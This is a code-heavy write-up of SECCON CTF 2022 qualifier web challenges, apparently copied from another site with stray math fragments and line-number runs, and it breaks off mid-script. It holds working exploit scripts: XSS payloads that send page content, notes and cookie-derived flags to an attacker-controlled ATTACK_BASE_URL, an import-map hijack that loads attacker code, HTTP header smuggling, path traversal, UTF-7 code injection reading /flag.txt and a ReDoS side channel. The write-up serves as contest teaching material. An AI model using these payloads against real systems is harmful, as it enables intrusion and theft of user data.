# SECCON CTF 2022 Quals writeup – English

> 原文: https://www.ctfiot.com/77788.html
> ID: 77788

(11),(−11),(1−1),(−1−1),(10),(−10),(01),(0−1)(11​),(−11​),(1−1​),(−1−1​),(10​),(−10​),(01​),(0−1​)

∀x∈[X,X+1],perlin2(x,Y)=0.∀x∈[X,X+1],perlin2(x,Y)=0.

perlin2(x,Y)=lerp(n00,n10,fade(x−⌊x⌋))=lerp(0,0,fade(x−⌊x⌋))=0 ■perlin2(x,Y)=lerp(n00​,n10​,fade(x−⌊x⌋))=lerp(0,0,fade(x−⌊x⌋))=0■​

Because of my lack of consideration, many players solved this challenge by unintended solutions ↩︎

In fact, you can skip this step because bfcache is disabled by default options of puppeteer. ↩︎


```
1
2
3
4
5
6
7
8
9
```



```
server {
 listen 8080 default_server;
 server_name nginx;

 location / {
 set $args "${args}&proxy=nginx";
 proxy_pass http://web:3000;
 }
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
```



```
const app = require("express")();

const FLAG = process.env.FLAG ?? "SECCON{dummy}";
const PORT = 3000;

app.get("/", (req, res) => {
 req.query.proxy.includes("nginx")
 ? res.status(400).send("Access here directly, not via nginx :(")
 : res.send(`Congratz! You got a flag: ${FLAG}`);
});

app.listen({ port: PORT, host: "0.0.0.0" }, () => {
 console.log(`Server listening at ${PORT}`);
});
```



```
1
2
3
```



```
// from: https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L54-L55
var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;
var parts = cleanStr.split(options.delimiter, limit);
```



```
1
2
3
4
5
6
7
8
9
10
11
```



```
import os
import httpx

BASE_URL = "http://skipinx.seccon.games:8080"

# ref. https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L21
PARAMETER_LIMIT = 1000

query = "proxy=something" + ("&"*(PARAMETER_LIMIT - 1))
res = httpx.get(f"{BASE_URL}/?{query}")
print(res.text)
```



```
1
```



```
SECCON{sometimes_deFault_options_are_useful_to_bypa55}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
```



```
from flask import Flask, request, Response
import subprocess
import os

app = Flask(__name__)

def validate(key: str) -> bool:
 # E.g. key == "{name}" -> True
 # key == "name" -> False
 if len(key) == 0:
 return False
 is_valid = True
 for i, c in enumerate(key):
 if i == 0:
 is_valid &= c == "{"
 elif i == len(key) - 1:
 is_valid &= c == "}"
 else:
 is_valid &= c != "{" and c != "}"
 return is_valid

def template(text: str, params: dict[str, str]) -> str:
 # A very simple template engine
 for key, value in params.items():
 if not validate(key):
 return f"Invalid key: {key}"
 text = text.replace(key, value)
 return text

@app.after_request
def waf(response: Response):
 if b"SECCON" in b"".join(response.response):
 return Response("Try harder")
 return response

@app.route("/")
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
 if ".." in filename or "%" in filename:
 return "Do not try path traversal :("

 try:
 proc = subprocess.run(
 ["curl", f"file://{os.getcwd()}/public/{filename}"],
 capture_output=True,
 timeout=1,
 )
 except subprocess.TimeoutExpired:
 return "Timeout"

 if proc.returncode != 0:
 return "Something wrong..."
 return template(proc.stdout.decode(), request.args)
```



```
1
2
3
4
5
```



```
proc = subprocess.run(
 ["curl", f"file://{os.getcwd()}/public/{filename}"],
 capture_output=True,
 timeout=1,
)
```



```
1
2
```



```
if ".." in filename or "%" in filename:
 return "Do not try path traversal :("
```



```
1
2
3
4
5
6
7
8
9
```



```
$ http "http://localhost:3000/.{.}/.{.}/flag.txt"
HTTP/1.1 200 OK
Connection: close
Content-Length: 10
Content-Type: text/html; charset=utf-8
Date: Sat, 05 Nov 2022 12:09:18 GMT
Server: Werkzeug/2.2.2 Python/3.10.8

Try harder
```



```
1
2
3
4
5
```



```
@app.after_request
def waf(response: Response):
 if b"SECCON" in b"".join(response.response):
 return Response("Try harder")
 return response
```



```
1
```



```
return template(proc.stdout.decode(), request.args)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
```



```
def validate(key: str) -> bool:
 # E.g. key == "{name}" -> True
 # key == "name" -> False
 if len(key) == 0:
 return False
 is_valid = True
 for i, c in enumerate(key):
 if i == 0:
 is_valid &= c == "{"
 elif i == len(key) - 1:
 is_valid &= c == "}"
 else:
 is_valid &= c != "{" and c != "}"
 return is_valid

def template(text: str, params: dict[str, str]) -> str:
 # A very simple template engine
 for key, value in params.items():
 if not validate(key):
 return f"Invalid key: {key}"
 text = text.replace(key, value)
 return text
```



```
1
2
3
4
5
```



```
{
 "{name}": "{",
 "{": "}{",
 "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": ""
}
```



```
1
2
3
4
5
6
7
```



```
... snip ...
<body>
 <h1>Hello, {name}!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}
```



```
1
2
3
4
5
6
7
```



```
... snip ...
<body>
 <h1>Hello, {!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}
```



```
1
2
3
4
5
6
7
```



```
... snip ...
<body>
 <h1>Hello, }{!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON}{real_flag}
```



```
1
2
3
```



```
... snip ...
<body>
 <h1>Hello, }{real_flag}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
```



```
import os
import httpx

BASE_URL = f"http://easylfi.seccon.games:3000"

res = httpx.get(
 BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
 params={
 "{name}": "{",
 "{": "}{",
 "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
 },
)

print("SECCON" + res.text.split("<h1>Hello, }")[1])
```



```
1
```



```
SECCON{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
```



```
version: "3"

services:
 nginx:
 build: ./nginx
 restart: always
 ports:
 - "3000:3000"
 bff:
 build: ./bff
 restart: always
 backend:
 build: ./backend
 restart: always
 report:
 build: ./report
 restart: always
 bot:
 build: ./bot
 restart: always
 environment:
 - FLAG=SECCON{dummydummy}
```



```
1
2
```



```
const result = await (await fetch("/api?expr=" + encodeURIComponent(expr))).text();
document.getElementById("result").innerHTML = result || " ";
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```



```
def proxy(req) -> str:
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("backend", 3000))
 sock.settimeout(1)

 payload = ""
 method = req.method
 path = req.path_info
 if req.query_string:
 path += "?" + req.query_string
 payload += f"{method} {path} HTTP/1.1\r\n"
 for k, v in req.headers.items():
 payload += f"{k}: {v}\r\n"
 payload += "\r\n"

 sock.send(payload.encode())
 time.sleep(.3)
 try:
 data = sock.recv(4096)
 body = data.split(b"\r\n\r\n", 1)[1].decode()
 except (IndexError, TimeoutError) as e:
 print(e)
 body = str(e)
 return body
```



```
1
2
3
4
5
6
```



```
# From: https://github.com/Pylons/waitress/blob/v2.1.2/src/waitress/parser.py#L409-L413
first_line_re = re.compile(
 b"([^ ]+) "
 b"((?:[^ :?#]+://[^ ?#/]*(?:[0-9]{1,5})?)?[^ ]+)"
 b"(( HTTP/([0-9.]+))$|$)"
)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
```



```
const fastify = require("fastify")();

const fail = (message) => {
 console.error(message);
 return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
 const encode = (bs) => {
 // ref. https://www.rfc-editor.org/rfc/rfc2047.html#section-2
 charset = "iso-8859-1";
 encoding = "q";
 encoded_text = Array.from(Buffer.from(bs))
 .map((x) => "=" + Buffer.from([x]).toString("hex"))
 .join("");
 return `=?${charset}?${encoding}?${encoded_text}?=`;
 };

 const contentLength =
 "Accept: */*\r\nReferer: http://nginx:3000/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: "
 .length;
 const evilHeader = encode(`bbb\r\nContent-Length: ${contentLength}\r\n`);

 const evilJs = `
 const main = async () => {
 document.cookie = '/?a=b HTTP/1.1';

 const res = await fetch('/api?expr=1', {
 method: 'GET',
 headers: {
 'aaa': '${evilHeader}',
 },
 });
 location = '${ATTACK_BASE_URL}/?text=' + encodeURIComponent(await res.text());
 };
 main();
 `.replaceAll("\n", "");
 if (evilJs.includes('"')) {
 fail("Invalid evilJs");
 }

 const xssPayload = `<img src=0 onerror="${evilJs}">`;

 const res = await (
 await fetch(`${SECCON_BASE_URL}/report`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 expr: xssPayload,
 }),
 })
 ).text();
 console.log(res); // "Received :)"
};

const start = async () => {
 fastify.get("/", async (req, reply) => {
 const text = req.query.text;
 console.log(text); // Print a flag

 process.exit(0);
 });

 fastify.listen(
 { port: LISTEN_PORT, host: "0.0.0.0" },
 async (err, address) => {
 if (err) {
 fastify.log.error(err);
 process.exit(1);
 }

 await sleep(1000);
 await exploit();

 await sleep(5000);
 console.log("Failed");
 process.exit(1);
 }
 );
};
start();
```



```
1
```



```
SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
```



```
<!DOCTYPE html>
<html>
<head>
 <!-- snip -->
</head>
<body style="padding: 3rem;">
 <!-- snip -->

 <script>
 trustedTypes.createPolicy("default", {
 createHTML: (unsafe) => {
 return DOMPurify.sanitize(unsafe)
 .replace(/SECCON{.+}/g, () => {
 // Delete a secret in RegExp
 "".match(/^$/);
 return "SECCON{REDACTED}";
 });
 },
 });
 </script>
 <script>
 const get = (path) => {
 return path.split("/").reduce((obj, key) => obj[key], document.all);
 };

 const init = async () => {
 /* snip */
 };

 const main = async () => {
 const params = new URLSearchParams(location.search);

 const message = `${params.get("message")}${
 document.cookie.split("FLAG=")[1] ?? "SECCON{dummy}"
 }`;
 // Delete a secret in document.cookie
 document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 get("message").innerHTML = message;

 const emoji = get(params.get("emoji"));
 get("message").innerHTML = get("message").innerHTML.replace(/{{emoji}}/g, emoji);
 };

 document.addEventListener("DOMContentLoaded", async () => {
 await init();
 await main();
 });
 </script>
</body>
</html>
```



```
1
2
3
4
5
6
7
8
9
10
```



```
trustedTypes.createPolicy("default", {
 createHTML: (unsafe) => {
 return DOMPurify.sanitize(unsafe)
 .replace(/SECCON{.+}/g, () => {
 // Delete a secret in RegExp
 "".match(/^$/);
 return "SECCON{REDACTED}";
 });
 },
});
```



```
1
2
```



```
> createHTML('SECCON{x<p id="}<img src=0 onerror=console.log(1)>"></p>')
'SECCON{REDACTED}<img src=0 onerror=console.log(1)>"></p>'
```



```
1
```



```
document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
```



```
1
2
```



```
// Delete a secret in RegExp
"".match(/^$/);
```



```
1
```



```
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["input"]
```



```
1
2
3
4
5
6
7
8
```



```
> DOMPurify.sanitize('x<script><SECCON{xxx}')
'x'
> RegExp.input
'<SECCON{xxx}'
> RegExp.rightContext
'ECCON{xxx}'
> document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
'ECCON{xxx}'
```



```
1
2
3
4
5
6
```



```
const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
const url = `http://web:3000/result?${new URLSearchParams({
 emoji,
 message,
})}`;
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
```



```
const fastify = require("fastify")();

const fail = (message) => {
 console.error(message);
 return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
 const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
 const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
 const url = `http://web:3000/result?${new URLSearchParams({
 emoji,
 message,
 })}`;

 const res = await (
 await fetch(`${SECCON_BASE_URL}/report`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 url,
 }),
 })
 ).text();
 console.log(res); // "Received :)"
};

const start = async () => {
 fastify.get("/", async (req, reply) => {
 const text = req.query.text;

 // Print a flag
 console.log("S" + text);
 // -> SECCON{real_flag} SECCON{REDACTED}">

 process.exit(0);
 });

 fastify.listen(
 { port: LISTEN_PORT, host: "0.0.0.0" },
 async (err, address) => {
 if (err) {
 fastify.log.error(err);
 process.exit(1);
 }

 await sleep(1000);
 await exploit();

 await sleep(5000);
 console.log("Failed");
 process.exit(1);
 }
 );
};
start();
```



```
1
```



```
SECCON{w0w_yoU_div3d_deeeeeep_iNto_DOMPurify}
```



```
1
2
3
```



```
if ("{{FLAG}}" in output) {
 delete output["{{FLAG}}"];
}
```



```
1
2
3
4
5
6
7
8
```



```
fn validate_identifier(ident: &Ident) -> Result<(), String> {
 // Limit available variables to `input` and `output` only.
 if ident.sym.eq("input") || ident.sym.eq("output") {
 Ok(())
 } else {
 Err(format!("{:?}", ident))
 }
}
```



```
1
2
3
4
5
6
7
8
```



```
fn validate_assign_expr(expr: &AssignExpr) -> Result<(), String> {
 (match expr.left.as_pat() {
 Some(Pat::Expr(expr)) => validate_expr(expr),
 _ => Err(format!("{:?}", expr.left)),
 })?;
 validate_expr(&expr.right)?;
 Ok(())
}
```



```
1
2
3
4
5
6
7
```



```
if ("{{FLAG}}" in output) {
 delete output["{{FLAG}}"];
}

const filename = crypto.randomUUID().replaceAll("-", "") + ".json";
await Deno.writeTextFile(filename, JSON.stringify(output));
console.log(filename);
```



```
1
2
```



```
"".constructor.prototype.replaceAll = "".constructor.raw;
"".constructor.prototype.raw = input.filename;
```



```
1
2
3
4
5
6
7
```



```
// From: https://deno.land/x/deno@v1.27.1/cli/schemas/config-file.v1.json
/* snip */
 "importMap": {
 "description": "The location of an import map to be used when resolving modules. If an import map is explicitly specified, it will override this value.",
 "type": "string"
 },
/* snip */
```



```
1
2
3
```



```
if ("{{FLAG}}" in output) {
 delete output["{{FLAG}}"];
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```



```
export const crypto = {
 randomUUID: () => ({
 replaceAll: () => "dummy",
 }),
};

const proxy1 = new Proxy(
 {},
 {
 has(target, propertyKey) {
 console.log(propertyKey); // output a flag
 return Reflect.has(...arguments);
 },
 }
);

const proxy2 = new Proxy(
 {},
 {
 set(target, property, value, receiver) {
 Object.setPrototypeOf(value, proxy1);
 return Reflect.set(...arguments);
 },
 }
);

JSON.parse = () => proxy2;
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
```



```
const fastify = require("fastify")();
const fs = require("node:fs");

const fail = (message) => {
 console.error(message);
 return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const source = `
 output.importMap = input.importMap;
 output.imports = input.imports;
 "".constructor.prototype.replaceAll = "".constructor.raw;
 "".constructor.prototype.raw = input.filename;

 input.key = output;
`;

const importMapJson = JSON.stringify({
 filename: "import_map",
 imports: {
 "https://deno.land/std@0.161.0/crypto/mod.ts": `${ATTACK_BASE_URL}/evil.js`,
 },
});

const denoJson = JSON.stringify({
 filename: "deno",
 importMap: "import_map.json",
});

const exploit = async () => {
 const path = await (
 await fetch(`${SECCON_BASE_URL}/`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 source,
 }),
 })
 ).text();

 await fetch(`${SECCON_BASE_URL}${path}/run`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 input: importMapJson,
 }),
 });

 await fetch(`${SECCON_BASE_URL}${path}/run`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 input: denoJson,
 }),
 });

 const flag = await (
 await fetch(`${SECCON_BASE_URL}${path}/run`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 input: "",
 }),
 })
 ).text();

 console.log(flag);
};

const start = async () => {
 const evilJs = fs.readFileSync("evil.js").toString();
 fastify.get("/evil.js", async (req, reply) => {
 return evilJs;
 });

 fastify.listen(
 { port: LISTEN_PORT, host: "0.0.0.0" },
 async (err, address) => {
 if (err) fail(err);

 await sleep(1000);
 await exploit();
 fastify.close();
 }
 );
};
start();
```



```
1
```



```
SECCON{thE_denO_masc0t_dino5auR_staNding_in_tHe_s4ndbox}
```



```
1
2
3
```



```
sendNote(reply, noteId) {
 return reply.sendFile(`db/${this.id}/${noteId}`);
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
```



```
/* snip */

const validate = (id) => {
 if (typeof id !== "string") {
 throw Error(`Invalid id: ${id}`);
 }
 if (
 id.includes("..") ||
 id.includes("/") ||
 id.includes("\\") ||
 id.includes("%")
 ) {
 // No path traversal
 throw Error(`Invalid id: ${id}`);
 }
 return id;
};

/* snip */

class User {
 /* snip */

 async deleteNote(noteId) {
 await fs.writeFile(`db/${this.id}/${noteId}`, `deleted: ${noteId}`);
 return noteId;
 }

 /* snip */
}

/* snip */

fastify.post("/api/notes/delete", async (request, reply) => {
 const user = new User(request.session.userId);
 const noteId = validate(request.body.noteId);
 await user.deleteNote(noteId);
 return { noteId };
});

/* snip */
```



```
1
```



```
GET /api/notes/<img src=0 onerror="alert(1)">.html
```



```
1
```



```
<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">.html
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
```



```
<body>
 <script>
 const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

 const deleteNote = (url, noteId) => {
 const form = document.createElement("form");
 form.action = url;
 form.method = "post";
 form.target = "_blank";

 const input = document.createElement("input");
 input.name = "noteId";
 input.value = noteId;
 form.appendChild(input);

 document.body.appendChild(form);
 form.submit();
 };

 const evilJs = `
 (async () => {
 const { token } = await (await fetch("/api/token")).json();

 const noteIds = await (
 await fetch("/api/notes", {
 headers: { "X-Token": token },
 })
 ).json();

 const notes = await Promise.all(
 noteIds.map((id) =>
 fetch("/api/notes/" + id, {
 headers: { "X-Token": token },
 }).then((res) => res.text())
 )
 );

 navigator.sendBeacon("${location.origin}", notes.join("\\n"));
 })();
 `;

 const main = async () => {
 const params = new URLSearchParams(location.search);
 const baseUrl = params.get("baseUrl");
 const noteId = params.get("noteId");

 {
 // Delete a note (and create a deleted page) with CSRF
 const url = `${baseUrl}/api/notes/delete`;
 deleteNote(url, noteId);
 }
 await sleep(1000);

 let evilWindow;
 {
 // Access to the deleted page with no token
 // Then, the browser will render a response with 500 status.
 const url = `${baseUrl}/api/notes/${noteId}`;
 evilWindow = open(url);
 }
 await sleep(1000);
 {
 // Open the bot's user page
 // Then, it will pollute the disk cache for the deleted page.
 evilWindow.location = baseUrl;
 }
 await sleep(1000);
 {
 // Access to the deleted page again using History API
 // Then, the browser will render the cached page and the XSS will occur!
 // Note that a bfcache will not be used because the page will have a window.opener reference.
 // ref. https://web.dev/i18n/en/bfcache/#avoid-windowopener-references
 evilWindow.location = `${location.origin}/back.html?n=2`;
 }
 await sleep(1000);
 {
 // Send a JavaScript code via postMessage
 // Then, the XSS window will execute it!
 evilWindow.postMessage(evilJs, baseUrl);
 }
 };
 main();
 </script>
</body>
```



```
1
2
3
4
```



```
<script>
 const n = parseInt(new URLSearchParams(location.search).get("n"));
 history.go(-n);
</script>
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
```



```
const path = require("node:path");

const fail = (message) => {
 console.error(message);
 return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

if (!ATTACK_BASE_URL.startsWith("http://")) {
 fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
 const noteId =
 // XSS payload:
 `<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">` +
 // .html -> Content-Type: text/html
 // ref. https://github.com/broofa/mime/blob/main/types/standard.js
 ".html";

 if (noteId.length > 100) {
 // ref. https://github.com/delvedor/find-my-way/blob/v7.3.0/index.js#L87
 fail(`Too long id: ${noteId}`);
 }
 if (
 noteId.includes("..") ||
 noteId.includes("/") ||
 noteId.includes("\\") ||
 noteId.includes("%")
 ) {
 fail(`Invalid id: ${noteId}`);
 }

 const baseUrl = "http://web:3000";

 const reportedUrl = `${ATTACK_BASE_URL}/index.html?${new URLSearchParams({
 baseUrl,
 noteId,
 })}`;

 const res = await (
 await fetch(`${SECCON_BASE_URL}/report`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({
 url: reportedUrl,
 }),
 })
 ).text();
 console.log(res); // "Received :)"
};

const fastify = require("fastify")();

fastify.register(require("@fastify/static"), {
 root: path.join(__dirname, "public"),
});

fastify.post("/", async (req, reply) => {
 // Received data from navigator.sendBeacon
 console.log(req.body); // Got a flag!
 process.exit(0);
});

const start = async () => {
 fastify.listen(
 { port: LISTEN_PORT, host: "0.0.0.0" },
 async (err, address) => {
 if (err) {
 fastify.log.error(err);
 process.exit(1);
 }

 await sleep(1 * 1000);
 await exploit();
 await sleep(10 * 1000);
 fail("Failed");
 }
 );
};
start();
```



```
1
```



```
SECCON{hack3rs_po11ute_3verything_by_v4ri0us_meanS}
```



```
1
```



```
nc latexipy.seccon.games 2337
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
```



```
$ nc latexipy.seccon.games 2337
Latexify as a Service!

E.g.
`` `
def solve(a, b, c):
 return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
`` `
ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb

Input your function (the last line must start with __EOF__):
def f(x, y, z):
 return (x + y)*z
__EOF__

Result:
\mathrm{f}(x, y, z) \triangleq (x + y)z
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
```



```
import sys
import ast
import re
import tempfile
from importlib import util

def get_fn_name(source: str) -> str | None:
 root = ast.parse(source)
 if type(root) is not ast.Module:
 return None
 if len(root.body) != 1:
 return None

 fn = root.body[0]
 if type(fn) is not ast.FunctionDef:
 return None

 fn.body.clear()
 if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
 # You must define a function without decorators, type annotations, and so on.
 return None

 return str(fn.name)

print("""
Latexify as a Service!

E.g.
`` `
def solve(a, b, c):
 return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
`` `
ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb

Input your function (the last line must start with __EOF__):
""".strip(), flush=True)

source = ""
while True:
 line = sys.stdin.readline()
 if line.startswith("__EOF__"):
 break
 source += line

name = get_fn_name(source)
if name is None:
 print("Invalid source")
 exit(1)

source += f"""
import latexify
__builtins__["print"](latexify.get_latex({name}))
"""

with tempfile.NamedTemporaryFile(suffix=".py") as file:
 file.write(source.encode())
 file.flush()

 print()
 print("Result:")
 spec = util.spec_from_file_location("tmp", file.name)
 spec.loader.exec_module(util.module_from_spec(spec))
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
```



```
def get_fn_name(source: str) -> str | None:
 root = ast.parse(source)
 if type(root) is not ast.Module:
 return None
 if len(root.body) != 1:
 return None

 fn = root.body[0]
 if type(fn) is not ast.FunctionDef:
 return None

 fn.body.clear()
 if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
 # You must define a function without decorators, type annotations, and so on.
 return None

 return str(fn.name)
```



```
1
2
```



```
spec = util.spec_from_file_location("tmp", file.name)
spec.loader.exec_module(util.module_from_spec(spec))
```



```
1
2
3
4
5
```



```
# coding: utf_7
def f(x):
 return x
 #+AAo-print(open("/flag.txt").read())
__EOF__
```



```
1
2
3
4
```



```
def f(x):
 return x

print(open("/flag.txt").read())
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
```



```
import os
import pwn

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
 return x
 #+AAo-print(open("/flag.txt").read())
""".lstrip()

payload += "__EOF__"

io.sendlineafter(b"__EOF__):", payload.encode())

print(io.recvall().decode())
```



```
1
```



```
SECCON{UTF7_is_hack3r_friend1y_encoding}
```



```
1
```



```
sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022
```



```
1
2
3
4
5
6
7
8
9
```



```
#!/bin/bash

read -p "Input a file path: " filepath
file $filepath 2>/dev/null | grep -q "ASCII text" 2>/dev/null

# TODO: print the result the above command.
# $? == 0 -> It's a text file.
# $? != 0 -> It's not a text file.
exit 0
```



```
1
2
3
4
```



```
-m, --magic-file magicfiles
 Specify an alternate list of files and directories containing magic. This can be a single item,
 or a colon-separated list. If a compiled magic file is found alongside a file or directory, it
 will be used instead.
```



```
1
2
3
4
```



```
regex A regular expression match in extended POSIX regular expression syntax (like egrep).
 Regular expressions can take exponential time to process, and their performance is
 hard to predict, so their use is discouraged. When used in production environments,
 their performance should be carefully checked. The size of ... snip ...
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
```



```
import string
import os
import pwn
import time

REDOS_POWER = 20
TIMEOUT = 20

SSH_CMD = f"sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@{os.getenv('SECCON_HOST')} -p {os.getenv('SECCON_PORT')}"

def get_time(rule: str) -> bool:
 io = pwn.process(SSH_CMD, shell=True, stdin=pwn.PTY, raw=False)
 io.sendlineafter(b"Input a file path: ", b"-m /dev/tty /flag.txt")
 io.sendline(rule.encode())
 for i in range(REDOS_POWER):
 io.sendline(f">0 regex \\^(((((((((((((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*@ ReDoS-{i}".encode())
 io.recvuntil(f"ReDoS-{REDOS_POWER - 1}".encode(), timeout=TIMEOUT)
 io.send("\x04") # Ctrl+D

 t1 = time.time()
